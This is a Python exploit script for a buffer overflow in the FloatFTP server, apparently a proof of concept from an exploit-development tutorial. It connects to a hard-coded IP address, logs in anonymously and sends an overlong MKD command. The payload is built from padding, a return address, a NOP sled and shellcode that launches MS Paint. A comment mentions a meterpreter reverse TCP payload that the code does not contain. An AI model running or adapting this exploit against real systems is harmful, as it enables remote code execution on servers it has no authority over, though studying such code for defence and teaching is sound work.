#Created by: Uday Mittal (Yaksas CSC)

#This code exploits the buffer overflow vulnerability in FloatFTP. It uses a custom shellcode that launches MS PAINT application.

#Refer: https://www.fuzzysecurity.com/tutorials/expDev/6.html

#arwin - win32 address resolution program - by steve hanna - v.01 WinExec is located at 0x7c863231 in kernel32.dll

# XOR EAX, EAX - \x33\xC0
# PUSH EAX - \x50
# PUSH "exe " - \x68\x65\x78\x65\x20
# PUSH "int." - \x68\x69\x6E\x74\x2E
# PUSH "mspa" - \x68\x6D\x73\x70\x61
# MOV EAX, ESP - \x8B\xC4
# PUSH 1 - \x6A\x01
# PUSH EAX - \x50
# MOV EBX, 7C863231 - \xBB\x31\x32\x86\x7C
# CALL EBX - \xFF\xD3
 
import socket
import sys

#Shellcode payload: windows/meterpreter/reverse_tcp LHOST=192.168.43.28 LPORT=4444 Bad characters = '\x00\x0A\x0D'

buf =  "\x33\xC0\x50\x68\x65\x78\x65\x20\x68\x69\x6E\x74\x2E\x68\x6D\x73\x70\x61\x8B\xC4\x6A\x01\x50\xBB\x31\x32\x86\x7C\xFF\xD3"

nop = "\x90"*20

evil = "A"*247 + "\x59\x54\xC3\x77" + nop + buf + "\x90" * (1000-247-20-len(buf))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.43.72',21))

s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD '+evil+'\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
